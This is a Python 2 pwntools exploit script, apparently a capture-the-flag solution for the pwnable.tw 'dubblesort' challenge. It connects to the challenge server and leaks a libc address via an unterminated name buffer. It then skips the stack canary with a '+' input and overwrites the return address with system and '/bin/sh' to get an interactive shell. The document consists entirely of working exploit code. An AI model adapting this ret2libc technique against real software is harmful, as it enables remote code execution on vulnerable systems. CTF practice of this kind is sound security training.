#!/bin/bash python 

from pwn import *

#r = process('./dubblesort', env={"LD_PRELOAD":"/lib/i386-linux-gnu/libc.so.6"})
#r = process('./dubblesort', env={"LD_PRELOAD":"libc_32.so.6"})
r = remote('chall.pwnable.tw', 10101)

context.endian = 'little'

my_name = 'a'*24
r.sendlineafter('What your name :', my_name)

raw_input("@")
r.recvuntil("\n")
leak = u32(r.recvuntil(",")[:4])
leak = ((leak<<8) & 0xffffffff)
offset = 0xf771f000 - 0xf756f000
libc_base = leak - offset
libc_sys = libc_base + 0x3a940
#libc_sys = libc_base + 0x3ada0
print hex(leak)
print hex(libc_base)
print hex(libc_sys)

libc = ELF('libc_32.so.6')
sh = next(libc.search('sh\x00'))
binsh = next(libc.search('/bin/sh\x00'))
print hex(sh)
print hex(binsh)
print hex(libc_base + 0x158e8b)


num = 35
r.sendline(str(num))
for i in range(num):
	if (i == 24):
		print "canary"
		raw_input("@")
		r.sendlineafter("number : ", "+")
	elif (i == 33) | (i == 34):
                r.sendlineafter("number : ", str(libc_base + 0x158e8b))
	elif (i >= 25) & (i <= 32):
		r.sendlineafter("number : ", str(libc_sys)) 
	else:
		r.sendlineafter("number : ", str(i))

r.interactive()
